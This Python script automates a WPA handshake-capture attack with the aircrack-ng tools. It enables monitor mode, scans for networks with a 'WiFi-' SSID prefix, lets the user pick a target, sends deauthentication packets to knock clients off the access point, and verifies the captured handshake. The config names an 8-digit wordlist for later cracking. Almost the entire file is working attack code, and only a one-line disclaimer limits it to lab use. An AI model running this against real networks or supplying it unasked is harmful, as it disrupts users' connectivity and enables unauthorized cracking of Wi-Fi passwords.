#!/usr/bin/env python3
"""
Wireless network penetration testing script.
For educational purposes only. Use in controlled lab environments with permission.
"""

import os
import sys
import time
import signal
import logging
import subprocess
import pandas as pd
from datetime import datetime
from pathlib import Path
from typing import Optional, List, Dict

# Configuration
class Config:
    INTERFACE = "wlan1"
    MON_INTERFACE = f"{INTERFACE}mon"
    TARGET_SSID_PREFIX = "WiFi-"
    WORDLIST = "8digit.lst"
    CAPTURE_DIR = "./captures"
    ETH_INTERFACE = "eth0"
    HISTORY_FILE = "attack_history.txt"
    SCAN_TIME = 10  # seconds

# Set up logging
logging.basicConfig(
    level=logging.DEBUG if os.getenv('VERBOSE') else logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('debug.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class NetworkScanner:
    def __init__(self, config: Config):
        self.config = config
        self.capture_dir = Path(config.CAPTURE_DIR)
        self.capture_dir.mkdir(exist_ok=True)
        
    def check_root(self) -> None:
        """Check if script is running as root."""
        if os.geteuid() != 0:
            logger.error("This script must be run as root")
            sys.exit(1)

    def cleanup(self, signum=None, frame=None) -> None:
        """Stop monitor mode and clean up."""
        logger.info("Cleaning up: stopping monitor mode")
        subprocess.run(["airmon-ng", "stop", self.config.MON_INTERFACE], 
                      stdout=subprocess.DEVNULL, 
                      stderr=subprocess.DEVNULL)
        sys.exit(0)

    def start_monitor_mode(self) -> None:
        """Enable monitor mode on wireless interface."""
        logger.debug(f"Starting monitor mode on {self.config.INTERFACE}")
        result = subprocess.run(["airmon-ng", "start", self.config.INTERFACE],
                              capture_output=True, text=True)
        
        # Verify monitor mode is enabled
        iwconfig = subprocess.run(["iwconfig", self.config.MON_INTERFACE],
                                capture_output=True, text=True)
        if "Mode:Monitor" not in iwconfig.stdout:
            logger.error(f"Failed to enable monitor mode on {self.config.MON_INTERFACE}")
            self.cleanup()

        logger.info(f"Monitor mode enabled on {self.config.MON_INTERFACE}")

    def scan_networks(self) -> pd.DataFrame:
        """Scan for wireless networks."""
        logger.info(f"Scanning for networks with ESSID prefix '{self.config.TARGET_SSID_PREFIX}' ({self.config.SCAN_TIME}s scan)...")
        
        # Start airodump-ng scan
        scan_file = "scan"
        scan_proc = subprocess.Popen(
            ["airodump-ng", self.config.MON_INTERFACE, "--write", scan_file,
             "--write-interval", "1", "--output-format", "csv"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        # Show progress
        for _ in range(self.config.SCAN_TIME):
            print(".", end="", flush=True)
            time.sleep(1)
        print()

        # Kill airodump-ng
        scan_proc.terminate()
        scan_proc.wait()

        # Read and parse CSV
        try:
            df = pd.read_csv("scan-01.csv", header=0)
            # Clean up the dataframe
            df = df[df['ESSID'].notna()]  # Remove rows with empty ESSID
            df = df[df['ESSID'].str.contains(self.config.TARGET_SSID_PREFIX, na=False)]
            return df
        except Exception as e:
            logger.error(f"Failed to read scan results: {e}")
            return pd.DataFrame()

    def select_target(self, networks: pd.DataFrame) -> Dict:
        """Let user select target network from scan results."""
        if networks.empty:
            logger.error("No networks found matching prefix")
            self.cleanup()

        print("\nAvailable networks matching prefix '{}':".format(self.config.TARGET_SSID_PREFIX))
        print("-" * 75)
        print(f"{'ID':3} {'ESSID':20} {'Channel':8} {'Signal':8} {'Clients':8} {'Encryption':10}")
        print("-" * 75)

        for idx, row in networks.iterrows():
            print(f"{idx:3} {row['ESSID'][:20]:20} {row['channel']:8} "
                  f"{row['Power']:8} {row['Beacons']:8} {row['Privacy']:10}")

        while True:
            try:
                choice = input("\nSelect network ID or 'q' to quit: ")
                if choice.lower() == 'q':
                    self.cleanup()
                choice = int(choice)
                if 0 <= choice < len(networks):
                    return networks.iloc[choice].to_dict()
            except ValueError:
                print("Invalid selection. Please enter a number.")

    def capture_handshake(self, target: Dict) -> bool:
        """Capture WPA handshake for target network."""
        logger.info(f"Starting attack on {target['ESSID']}")
        
        # Start capturing
        cap_file = self.capture_dir / f"{target['ESSID']}_capture"
        capture_proc = subprocess.Popen(
            ["airodump-ng", "--bssid", target['BSSID'], "--channel", str(target['channel']),
             "--write", str(cap_file), "--write-interval", "1", "--output-format", "cap,csv",
             self.config.MON_INTERFACE],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        time.sleep(2)  # Give airodump time to start

        # Send deauth packets
        logger.info("Sending deauth packets...")
        deauth_result = subprocess.run(
            ["aireplay-ng", "--deauth", "20", "-a", target['BSSID'], self.config.MON_INTERFACE],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        if deauth_result.returncode != 0:
            logger.warning("Failed to send deauth packets")

        # Wait for handshake
        print("Waiting for handshake capture (15 seconds)...")
        for _ in range(15):
            print(".", end="", flush=True)
            time.sleep(1)
        print()

        # Stop capture
        capture_proc.terminate()
        capture_proc.wait()

        # Check for handshake
        cap_file = cap_file.with_suffix('.cap')
        if not cap_file.exists():
            logger.error("No capture file created")
            return False

        # Verify handshake
        result = subprocess.run(
            ["aircrack-ng", str(cap_file)],
            capture_output=True,
            text=True
        )
        
        if "handshake" in result.stdout:
            logger.info("Handshake captured successfully!")
            return True
        else:
            logger.error("No handshake found in capture")
            return False

def main():
    config = Config()
    scanner = NetworkScanner(config)
    
    # Set up signal handlers
    signal.signal(signal.SIGINT, scanner.cleanup)
    signal.signal(signal.SIGTERM, scanner.cleanup)
    
    # Check root privileges
    scanner.check_root()
    
    # Start monitor mode
    scanner.start_monitor_mode()
    
    # Scan for networks
    networks = scanner.scan_networks()
    
    # Select target
    target = scanner.select_target(networks)
    
    # Capture handshake
    if scanner.capture_handshake(target):
        print(f"Handshake captured! Check {config.CAPTURE_DIR} for capture files.")
    
    # Clean up
    scanner.cleanup()

if __name__ == "__main__":
    main() 